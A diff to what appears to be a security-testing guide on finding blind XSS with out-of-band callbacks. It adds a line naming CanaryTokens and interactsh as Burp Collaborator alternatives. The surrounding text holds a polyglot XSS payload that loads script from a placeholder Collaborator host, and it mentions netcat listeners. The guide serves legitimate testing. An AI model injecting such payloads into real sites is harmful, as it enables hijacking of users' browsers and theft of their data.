@@ -13,6 +13,7 @@ To test for blind XSS vulnerabilities, attackers can use out-of-band techniques 
 1. Right-click the request you want to investigate and select Send to Repeater.
 2. In the Repeater tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/BURP-COLLABORATOR-SUBDOMAIN/).slice(2), document.documentElement.appendChild(s))//'>`.
 3. Click Send.
+> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.
 ### Custom Remote Script
 An attacker can create their own custom script and host it on a server they own. Once a custom script is available, an attacker can start a listener using `netcat` or `php` or `python`.
 
